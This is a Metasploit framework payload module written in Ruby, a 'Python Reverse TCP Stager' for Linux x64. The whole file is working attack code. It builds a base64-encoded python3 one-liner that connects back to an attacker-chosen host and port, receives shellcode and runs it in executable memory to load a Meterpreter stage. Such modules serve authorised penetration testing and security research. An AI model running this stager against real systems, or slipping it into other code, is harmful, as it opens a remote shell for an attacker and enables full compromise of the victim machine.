##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 130

  include Msf::Payload::Stager

  def self.handler_type_alias
    "python_reverse_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker via python to load a native meterpreter stage',
      'Author'        => 'pasta <jaguinaga@faradaysec.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        => { 'Payload' => '' }))
  end

  def generate
    command_string
  end

  def command_string
    raw_cmd = %(import socket,struct,ctypes,ctypes.util
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}))
sc=b\"\\xbf\"+struct.pack(\"<L\",s.fileno())+s.recv(126)
l=ctypes.CDLL(ctypes.util.find_library(\"c\"))
l.mmap.restype=ctypes.c_void_p
l.mprotect.argtypes=[ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
m=l.mmap(0,len(sc),3,0x22,-1,0)
ctypes.memmove(m,sc,len(sc))
l.mprotect(m,len(sc),5)
ctypes.CFUNCTYPE(ctypes.c_int)(m)())
    raw_cmd.gsub!("\n",";")
    encoded_cmd = Rex::Text.encode_base64(raw_cmd)
    "python3 -c \"import base64;exec(base64.b64decode(b'#{encoded_cmd}'))\""
  end

end
